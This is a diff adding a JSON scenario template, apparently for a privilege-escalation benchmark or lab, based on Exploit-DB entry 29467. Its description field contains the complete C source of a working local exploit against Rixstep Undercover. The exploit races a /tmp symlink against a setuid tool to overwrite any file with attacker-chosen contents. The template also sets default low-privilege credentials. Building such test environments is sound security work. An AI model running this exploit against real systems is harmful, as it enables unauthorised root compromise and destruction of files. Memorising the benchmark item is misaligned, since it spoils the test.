@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_29467",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Rixstep Undercover - Local Privilege Escalation\n\nExploit source code (29467.c):\n```\n// source: https://www.securityfocus.com/bid/22071/info\n\nRixstep Undercover is prone to a local privilege-escalation vulnerability because of a design error in the affected application.\n\nAn attacker can exploit this issue to execute arbitrary code with superuser privileges, completely compromising affected computers. Failed exploit attempts will result in a denial of service.\n\n/*\n * ==== Comments from rixstep_pwnage.c ====\n * \"It may not come as a shocker, but so far the Month of Rixstep Bugs has not netted a single bug.\"\n * -- http://rixstep.com/1/20070115,00.shtml\n *\n * Maybe because nobody was looking?\n * Here's a nice little exploit to overwrite any file on the system courtesy of\n * Rixstep.\n *\n * Just run Undercover <ftp://rixstep.com/pub/Undercover.tar.bz2> once as an\n * administrator to create that nice little suid-tool.\n * Then run this app giving the path to the uc tool (Undercover.app/Contents/Resources/uc)\n * a file you want to overwrite, and the file the data to overwrite with is\n * located at.\n *\n * The pwnies aren't just for everyone else Rixstep.\n *\n * ==== More information for rixstep_pwnage_v2.c ====\n * It seems Rixstep thought they could fix their stupidity:\n * http://www.rixstep.com/1/1/20070115,02.shtml\n *\n * Silent security updates aren't cool.\n *\n * Unfortunately their bug fix was useless, maybe they forgot to actually do any\n * QA on it in their rush to say how fast they are at fixing exploits. Or maybe\n * they just don't have a clue.\n *\n * And for the record Rixstep: I am not from Unsanity, I have not worked for\n * Unsanity, I do not own any Unsanity products. I just think that you need to\n * calm down on your \"fanboy\" pronouncements.\n *\n * Oh and if you really wanted to give me a \"free\" license, feel free to contact\n * me at my evil data-mining gmail account. You told me not to contact you\n * (http://www.rixstep.com/0/contact.shtml) after all.\n *\n * Same instructions as before folks. This version is written for\n * Undercover.tar.bz2 with an MD5 of a30aa6239181928953527c9579a56471.\n *\n * Enjoy the pwnies.\n */\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nint main (int argc, char *argv[])\n{\n    pid_t pid;\n    char *overwrite_cmd, *uc_cmd;\n    if(argc != 4) {\n        fprintf(stderr, \"rixstep_pwnage.c\\n\");\n        fprintf(stderr, \"Usage: %s <uc tool path> <file to overwrite> <source file>\\n\", argv[0]);\n        return 1;\n    }\n\n    asprintf(&overwrite_cmd, \"/bin/cat %s > %s\", argv[3], argv[2]);\n    asprintf(&uc_cmd, \"%s + /tmp/rixstep_pwnies\", argv[1]);\n\n    symlink(argv[2], \"/tmp/.hidden\");\n    system(\"/usr/bin/touch /tmp/rixstep_pwnies\");\n\n    pid = fork();\n    if(pid == 0)\n    {\n        for (;;) {\n            system(overwrite_cmd);\n        }\n    }\n    if(pid > 0)\n    {\n        for (;;) {\n            system(uc_cmd);\n        }\n    }\n}\n```",
+  "cve": "",
+  "exploitdb_id": "29467",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_29467",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
